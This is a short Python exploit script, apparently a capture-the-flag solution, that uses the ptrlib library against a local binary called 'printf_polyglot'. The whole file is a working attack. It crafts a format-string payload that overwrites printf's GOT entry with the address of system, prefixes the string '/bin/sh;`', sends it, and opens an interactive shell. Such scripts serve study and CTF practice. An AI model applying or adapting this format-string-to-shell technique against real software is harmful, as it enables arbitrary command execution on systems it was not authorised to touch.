from ptrlib import *

elf = ELF("./printf_polyglot")
sock = Process("./printf_polyglot")
plt_system = 0x4006e0

sock.recvuntil("Exit.\n")
sock.sendline("3")
sock.recvuntil("below:\n")

writes = {elf.got("printf"): plt_system}
payload = b'/bin/sh;`'
payload += fsb(
    pos = 24,
    writes = writes,
    written = len(payload),
    bs = 2,
    bits = 64
)
assert len(payload) < 0x100
sock.sendline(payload)
sock.sendline("Y")
print(payload)

sock.interactive()
